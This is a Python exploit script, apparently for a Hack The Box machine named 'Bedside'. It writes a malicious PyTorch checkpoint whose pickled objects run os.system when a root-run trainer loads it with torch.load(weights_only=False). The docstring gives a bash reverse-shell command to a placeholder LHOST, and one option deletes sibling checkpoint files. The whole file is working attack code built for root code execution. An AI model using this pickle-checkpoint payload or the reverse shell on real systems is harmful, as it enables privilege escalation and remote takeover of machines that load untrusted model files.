#!/usr/bin/env python3
"""
Bedside (HTB) — plant malicious torch checkpoint for root RCE via bedside_trainer.

Run **on the target** where PyTorch is installed (host has monai/torch under
/usr/local), or on attacker with `torch` if you will copy the .pt via container.

Sudo (as developer):
  sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py

Trainer loads newest /datastore/checkpoints/*.pt via CheckpointLoader →
torch.load(..., weights_only=False) → pickle executes as root.

/datastore is typically only writable as datawrangler (container bind mount).
Developer alone cannot write there — plant from container or as root after another path.

Usage (on host as root, or any process that can write /datastore):
  python3 plant_checkpoint.py --out /datastore/checkpoints/zzz_pwn.pt \\
      --png /datastore/processed/sample.png \\
      --cmd "id > /tmp/from_ckpt; bash -c 'bash -i >& /dev/tcp/LHOST/9001 0>&1' &"

Then as developer:
  sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
import zlib
from pathlib import Path


def make_png(w: int = 64, h: int = 64, rgb: tuple[int, int, int] = (10, 40, 80)) -> bytes:
    def chunk(tag: bytes, data: bytes) -> bytes:
        return (
            struct.pack(">I", len(data))
            + tag
            + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        )

    raw = b"".join(b"\x00" + bytes(rgb) * w for _ in range(h))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


def build_evil_payload(cmd: str):
    class Evil:
        def __reduce__(self):
            return (os.system, (cmd,))

    return {"epoch": 1, "model": Evil(), "optimizer": Evil()}


def main() -> int:
    ap = argparse.ArgumentParser(description="Plant evil .pt + sample PNG for bedside_trainer")
    ap.add_argument("--out", default="./zzz_pwn.pt", help="checkpoint path (.pt)")
    ap.add_argument("--png", default=None, help="optional sample PNG path (processed/)")
    ap.add_argument(
        "--cmd",
        default="id > /tmp/from_ckpt",
        help="command executed as root on torch.load",
    )
    ap.add_argument("--clear-other-pt", action="store_true", help="delete sibling *.pt next to --out")
    args = ap.parse_args()

    try:
        import torch
    except ImportError:
        print("[-] need torch (run on the Bedside host or pip install torch)", file=sys.stderr)
        return 1

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    if args.clear_other_pt:
        for p in out.parent.glob("*.pt"):
            if p.resolve() != out.resolve():
                p.unlink(missing_ok=True)
                print(f"[*] removed {p}")

    payload = build_evil_payload(args.cmd)
    torch.save(payload, str(out))
    print(f"[+] wrote checkpoint {out} ({out.stat().st_size} B)")
    print(f"[+] cmd: {args.cmd}")

    if args.png:
        png_path = Path(args.png)
        png_path.parent.mkdir(parents=True, exist_ok=True)
        png_path.write_bytes(make_png())
        print(f"[+] wrote sample image {png_path}")

    print("[*] next: sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py")
    return 0


if __name__ == "__main__":
    sys.exit(main())
